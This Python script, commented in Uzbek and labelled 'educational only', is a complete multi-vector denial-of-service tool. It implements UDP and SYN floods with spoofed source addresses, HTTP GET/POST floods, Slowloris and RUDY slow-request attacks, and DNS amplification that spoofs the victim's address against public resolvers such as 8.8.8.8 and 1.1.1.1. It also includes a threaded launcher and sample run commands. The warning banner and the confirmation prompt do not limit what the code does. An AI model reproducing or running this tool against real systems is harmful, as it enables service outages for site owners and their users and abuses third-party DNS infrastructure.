#!/usr/bin/env python3
"""
Multi-Vector DDoS Simulation - FAQAT TA'LIM MAQSADIDA
Bu skript turli xil DDoS hujumlarini birlashtirib, multi-vector hujumni simulyatsiya qiladi.
DIQQAT: Bu kodni faqat o'zingizga tegishli test serverlarida ishlating!
"""

import socket
import random
import time
import threading
import sys
import argparse
import ssl
import requests
from concurrent.futures import ThreadPoolExecutor
try:
    from scapy.all import IP, TCP, UDP, DNS, DNSQR, send, fragment, RandShort
    scapy_available = True
except ImportError:
    print("[!] Scapy kutubxonasi topilmadi. SYN flood va DNS amplifikatsiya hujumlari ishlamaydi.")
    scapy_available = False

# Global o'zgaruvchilar
running = True
successful_connections = 0
failed_connections = 0

def print_status():
    """Hujum statistikasini ko'rsatish"""
    global successful_connections, failed_connections
    while running:
        sys.stdout.write(f"\r[+] Muvaffaqiyatli ulanishlar: {successful_connections} | Muvaffaqiyatsiz ulanishlar: {failed_connections}")
        sys.stdout.flush()
        time.sleep(1)

def generate_random_ip():
    """Tasodifiy IP manzil yaratish"""
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def generate_random_packet(min_size=64, max_size=1024):
    """Tasodifiy paket yaratish"""
    size = random.randint(min_size, max_size)
    return random.randbytes(size)

def generate_random_user_agent():
    """Tasodifiy User-Agent yaratish"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
    ]
    return random.choice(user_agents)

def udp_flood(target_ip, target_port, duration):
    """
    UDP Flood hujumi - serverga ko'p miqdorda UDP paketlar yuboradi
    """
    global successful_connections, failed_connections
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] UDP Flood boshlandi: {target_ip}:{target_port}")
    
    while time.time() < end_time and running:
        try:
            packet = generate_random_packet()
            sock.sendto(packet, (target_ip, target_port))
            successful_connections += 1
            # Juda tez yubormaslik uchun
            time.sleep(0.001)
        except Exception:
            failed_connections += 1
    
    sock.close()
    print(f"\n[+] UDP Flood tugadi: {target_ip}:{target_port}")

def syn_flood(target_ip, target_port, duration):
    """
    SYN Flood hujumi - serverga ko'p miqdorda SYN paketlar yuboradi
    """
    global successful_connections, failed_connections
    
    if not scapy_available:
        print("[!] Scapy kutubxonasi o'rnatilmagan. SYN flood ishga tushmaydi.")
        return
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] SYN Flood boshlandi: {target_ip}:{target_port}")
    
    while time.time() < end_time and running:
        try:
            # Scapy orqali SYN paketi yuborish
            source_ip = generate_random_ip()
            source_port = random.randint(1024, 65535)
            
            ip_packet = IP(src=source_ip, dst=target_ip)
            tcp_packet = TCP(sport=source_port, dport=target_port, flags="S")
            
            send(ip_packet/tcp_packet, verbose=0)
            successful_connections += 1
            # Juda tez yubormaslik uchun
            time.sleep(0.01)
        except Exception:
            failed_connections += 1
    
    print(f"\n[+] SYN Flood tugadi: {target_ip}:{target_port}")

def http_flood(target_url, duration, method="GET"):
    """
    HTTP Flood hujumi - serverga ko'p miqdorda HTTP so'rovlar yuboradi
    """
    global successful_connections, failed_connections
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] HTTP Flood boshlandi: {target_url} ({method})")
    
    while time.time() < end_time and running:
        try:
            headers = {
                "User-Agent": generate_random_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
            
            # URL ga tasodifiy parametrlar qo'shish (keshni chetlab o'tish uchun)
            random_param = f"?cache={random.randint(1, 1000000)}"
            full_url = f"{target_url}{random_param}"
            
            if method == "GET":
                response = requests.get(full_url, headers=headers, timeout=1, verify=False)
            else:  # POST
                # Tasodifiy ma'lumotlar yaratish
                data = {f"field{i}": f"value{random.randint(1, 1000000)}" for i in range(10)}
                response = requests.post(full_url, headers=headers, data=data, timeout=1, verify=False)
            
            successful_connections += 1
        except Exception:
            failed_connections += 1
        
        # Juda tez yubormaslik uchun
        time.sleep(0.1)
    
    print(f"\n[+] HTTP Flood tugadi: {target_url}")

def slowloris_attack(target_ip, target_port, duration, secure=False):
    """
    Slowloris hujumi - serverga ko'p miqdorda to'liqsiz HTTP so'rovlar yuboradi
    """
    global successful_connections, failed_connections
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] Slowloris hujumi boshlandi: {target_ip}:{target_port}")
    
    # Barcha ulanishlarni saqlash uchun ro'yxat
    sockets_list = []
    
    while time.time() < end_time and running:
        try:
            # Yangi ulanish yaratish
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            
            if secure:
                s = ssl.wrap_socket(s)
            
            # HTTP so'rovni boshlash, lekin to'liq yubormaslik
            s.send(f"GET /?{random.randint(1, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
            s.send(f"User-Agent: {generate_random_user_agent()}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            
            # Ulanishni ro'yxatga qo'shish
            sockets_list.append(s)
            successful_connections += 1
            
            # Mavjud ulanishlarga qo'shimcha headerlar yuborish
            for sock in list(sockets_list):
                try:
                    # Har 10 soniyada yangi header yuborish
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except:
                    sockets_list.remove(sock)
                    failed_connections += 1
            
            # Yangi ulanishlar yaratishni sekinlashtirish
            time.sleep(1)
            
        except Exception:
            failed_connections += 1
    
    # Barcha ulanishlarni yopish
    for s in sockets_list:
        try:
            s.close()
        except:
            pass
    
    print(f"\n[+] Slowloris hujumi tugadi: {target_ip}:{target_port}")

def rudy_attack(target_ip, target_port, target_path, duration, secure=False):
    """
    RUDY (R-U-Dead-Yet) hujumi - serverga juda sekin POST so'rovlar yuboradi
    """
    global successful_connections, failed_connections
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] RUDY hujumi boshlandi: {target_ip}:{target_port}{target_path}")
    
    while time.time() < end_time and running:
        try:
            # Ulanish yaratish
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((target_ip, target_port))
            
            if secure:
                s = ssl.wrap_socket(s)
            
            # POST ma'lumotlarini tayyorlash (juda katta hajmda)
            post_data = "data=" + "A" * 100000
            
            # HTTP headerlarni yuborish
            http_request = f"POST {target_path} HTTP/1.1\r\n"
            http_request += f"Host: {target_ip}\r\n"
            http_request += f"User-Agent: {generate_random_user_agent()}\r\n"
            http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            http_request += "Accept-Language: en-US,en;q=0.5\r\n"
            http_request += "Accept-Encoding: gzip, deflate\r\n"
            http_request += "Content-Type: application/x-www-form-urlencoded\r\n"
            http_request += f"Content-Length: {len(post_data)}\r\n"
            http_request += "Connection: keep-alive\r\n\r\n"
            
            # Headerlarni yuborish
            s.send(http_request.encode())
            successful_connections += 1
            
            # POST ma'lumotlarini juda sekin yuborish
            for i in range(len(post_data)):
                if not running or time.time() > end_time:
                    break
                
                # Bir bayt yuborish
                s.send(post_data[i].encode())
                
                # Baytlar orasida kutish
                time.sleep(random.uniform(5, 15))
            
            # Ulanishni yopish
            s.close()
            
        except Exception:
            failed_connections += 1
            try:
                s.close()
            except:
                pass
    
    print(f"\n[+] RUDY hujumi tugadi: {target_ip}:{target_port}{target_path}")

def dns_amplification(target_ip, dns_servers, duration, qname="google.com"):
    """
    DNS Amplifikatsiya hujumi - DNS serverlardan foydalanib, katta hajmdagi javoblarni target_ip ga yo'naltiradi
    """
    global successful_connections, failed_connections
    
    if not scapy_available:
        print("[!] Scapy kutubxonasi o'rnatilmagan. DNS amplifikatsiya hujumi ishga tushmaydi.")
        return
    
    start_time = time.time()
    end_time = start_time + duration
    
    print(f"[+] DNS Amplifikatsiya hujumi boshlandi: {target_ip}")
    
    while time.time() < end_time and running:
        try:
            for dns_server in dns_servers:
                # DNS so'rov paketi yaratish
                ip_packet = IP(src=target_ip, dst=dns_server)
                udp_packet = UDP(sport=RandShort(), dport=53)
                dns_packet = DNS(rd=1, qd=DNSQR(qname=qname, qtype="ANY"))
                
                # Paketni yuborish
                send(ip_packet/udp_packet/dns_packet, verbose=0)
                successful_connections += 1
                
                # Juda tez yubormaslik uchun
                time.sleep(0.01)
                
        except Exception:
            failed_connections += 1
    
    print(f"\n[+] DNS Amplifikatsiya hujumi tugadi: {target_ip}")

def multi_vector_attack(target, port, duration, attack_types, threads_per_attack=5):
    """
    Multi-Vector hujum - bir vaqtning o'zida bir nechta hujum turlarini ishga tushiradi
    """
    global running
    
    print(f"[+] Multi-Vector hujum boshlandi: {target}:{port}")
    print(f"[+] Hujum turlari: {', '.join(attack_types)}")
    print(f"[+] Davomiyligi: {duration} soniya")
    
    # Statistika ko'rsatish uchun thread
    stats_thread = threading.Thread(target=print_status)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Barcha hujum threadlarini saqlash uchun ro'yxat
    attack_threads = []
    
    try:
        with ThreadPoolExecutor(max_workers=len(attack_types) * threads_per_attack) as executor:
            # UDP Flood
            if "udp" in attack_types:
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(udp_flood, target, port, duration))
            
            # SYN Flood
            if "syn" in attack_types and scapy_available:
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(syn_flood, target, port, duration))
            
            # HTTP Flood (GET)
            if "http-get" in attack_types:
                target_url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(http_flood, target_url, duration, "GET"))
            
            # HTTP Flood (POST)
            if "http-post" in attack_types:
                target_url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(http_flood, target_url, duration, "POST"))
            
            # Slowloris
            if "slowloris" in attack_types:
                secure = port == 443
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(slowloris_attack, target, port, duration, secure))
            
            # RUDY
            if "rudy" in attack_types:
                secure = port == 443
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(rudy_attack, target, port, "/", duration, secure))
            
            # DNS Amplifikatsiya
            if "dns-amp" in attack_types and scapy_available:
                # Ochiq DNS serverlar (bu yerda faqat misol uchun)
                dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
                for _ in range(threads_per_attack):
                    attack_threads.append(executor.submit(dns_amplification, target, dns_servers, duration))
            
            # Barcha hujumlar tugashini kutish
            for future in attack_threads:
                future.result()
    
    except KeyboardInterrupt:
        print("\n[!] Hujum to'xtatildi (Ctrl+C)")
    finally:
        running = False
        print("\n[+] Barcha hujumlar to'xtatildi")

def main():
    parser = argparse.ArgumentParser(description="Multi-Vector DDoS Simulation - FAQAT TA'LIM MAQSADIDA")
    parser.add_argument("target", help="Nishon IP manzili yoki domen nomi")
    parser.add_argument("-p", "--port", type=int, default=80, help="Nishon port (standart: 80)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Hujum davomiyligi soniyalarda (standart: 30)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Har bir hujum turi uchun threadlar soni (standart: 5)")
    parser.add_argument("-a", "--attacks", default="all", 
                        help="Hujum turlari (vergul bilan ajratilgan): udp,syn,http-get,http-post,slowloris,rudy,dns-amp yoki 'all' (standart: all)")
    
    args = parser.parse_args()
    
    # Hujum turlarini aniqlash
    if args.attacks.lower() == "all":
        attack_types = ["udp", "syn", "http-get", "http-post", "slowloris", "rudy", "dns-amp"]
    else:
        attack_types = [attack.strip().lower() for attack in args.attacks.split(",")]
    
    # Ogohlantirish va tasdiqlash
    print("\n" + "=" * 70)
    print("OGOHLANTIRISH: Bu skript faqat ta'lim maqsadida yaratilgan!")
    print("Bu skriptni faqat o'zingizga tegishli test serverlarida ishlating.")
    print("Boshqa serverlar va saytlarga hujum qilish qonunga zid hisoblanadi.")
    print("=" * 70 + "\n")
    
    confirmation = input("Bu skriptni faqat ta'lim maqsadida va o'z serverlarimda ishlatishga rozilik bildiraman (ha/yo'q): ")
    if confirmation.lower() not in ["ha", "h", "yes", "y"]:
        print("Tasdiqlash rad etildi. Skript to'xtatildi.")
        sys.exit(1)
    
    # Hujumni boshlash
    try:
        multi_vector_attack(args.target, args.port, args.duration, attack_types, args.threads)
    except KeyboardInterrupt:
        print("\n[!] Skript to'xtatildi (Ctrl+C)")
        sys.exit(0)

if __name__ == "__main__":
    # SSL sertifikat tekshirishni o'chirish (faqat test uchun)
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Skript to'xtatildi (Ctrl+C)")
        sys.exit(0)


# run command 
# python3 multi-vector.py example.com --port 80 --duration 30 --threads 5 --attacks udp,syn,http-get,http-post,slowloris,rudy,dns-amp
# python3 multi-vector.py example.com --port 80 --duration 30 --threads 5 --attacks all
